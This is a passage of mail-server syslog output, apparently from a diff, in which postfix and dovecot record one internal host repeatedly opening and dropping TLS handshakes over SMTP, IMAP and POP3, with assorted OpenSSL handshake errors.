+Nov  6 11:08:34 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:34 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:34 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:34 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:35 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:35 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:35 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:35 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:35 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:36 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:36 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:36 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:36 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:36 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:37 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:08:37 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:37 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:37 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:37 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:38 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:38 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:38 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:38 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:38 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:38 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:38 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:39 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:39 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:39 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:39 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:39 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:40 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:40 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:40 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:40 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:40 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:41 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:41 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:41 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:41 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:41 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:42 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:08:42 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:42 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:42 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:42 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:42 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:43 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:43 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:43 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:43 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:43 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:44 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:44 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:44 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:44 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:44 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:45 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:45 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:45 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:45 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:45 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: 0
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5776]: warning: TLS library problem: 5776:error:1408C095:SSL routines:SSL3_GET_FINISHED:digest check failed:s3_both.c:231:
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:46 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:47 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:47 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:47 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:47 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:47 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:48 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:08:48 ubuntuA3 dovecot: imap-login: Aborted login (0 authentication attempts): rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: warning: TLS library problem: 5657:error:1408A0C1:SSL routines:SSL3_GET_CLIENT_HELLO:no shared cipher:s3_srvr.c:1006:
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:48 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:49 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:54 ubuntuA3 last message repeated 4 times
+Nov  6 11:08:54 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: 0
+Nov  6 11:08:54 ubuntuA3 postfix/smtpd[5776]: warning: TLS library problem: 5776:error:1408C095:SSL routines:SSL3_GET_FINISHED:digest check failed:s3_both.c:231:
+Nov  6 11:08:54 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:54 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:55 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:09:02 ubuntuA3 last message repeated 8 times
+Nov  6 11:09:02 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:09:03 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:09:08 ubuntuA3 last message repeated 6 times
+Nov  6 11:09:09 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:09:09 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:09:13 ubuntuA3 last message repeated 5 times
+Nov  6 11:09:14 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:09:14 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:09:15 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:09:15 ubuntuA3 postfix/smtpd[5657]: lost connection after UNKNOWN from unknown[10.43.2.77]
+Nov  6 11:09:15 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:09:15 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:09:15 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:09:27 ubuntuA3 last message repeated 13 times
+Nov  6 11:09:28 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:09:59 ubuntuA3 last message repeated 30 times
+Nov  6 11:10:07 ubuntuA3 last message repeated 9 times
+Nov  6 11:10:07 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:07 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:10:07 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:07 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:10:07 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:07 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:07 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:07 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:10:07 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:07 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:07 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:10:07 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:07 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:10:07 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:07 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:10:08 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:08 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: warning: TLS library problem: 5776:error:1408A0D7:SSL routines:SSL3_GET_CLIENT_HELLO:required cipher missing:s3_srvr.c:886:
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: warning: TLS library problem: 5776:error:1408A0D7:SSL routines:SSL3_GET_CLIENT_HELLO:required cipher missing:s3_srvr.c:886:
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:10:08 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:10:08 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:08 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:10:08 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:08 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:10:08 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:10:08 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:10:08 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:11:16 ubuntuA3 postfix/master[5941]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 11:11:16 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 11:11:18 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:11:44 ubuntuA3 last message repeated 32 times
+Nov  6 11:11:45 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:12:16 ubuntuA3 last message repeated 30 times
+Nov  6 11:12:44 ubuntuA3 last message repeated 35 times
+Nov  6 11:12:44 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:45 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:45 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:45 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:45 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:45 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:47 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:47 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:47 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:47 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:47 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:48 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:48 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:48 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:48 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:48 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:49 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:49 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:49 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:49 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:49 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:50 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:50 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:50 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:50 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:50 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:51 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:51 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:51 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:51 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:51 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:52 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:52 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:52 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:52 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:52 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:53 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:53 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:53 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:53 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:53 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:54 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:54 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:54 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:54 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:54 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:55 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:55 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:55 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:55 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:55 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:56 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:56 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:56 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:56 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:56 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:57 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:57 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:57 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
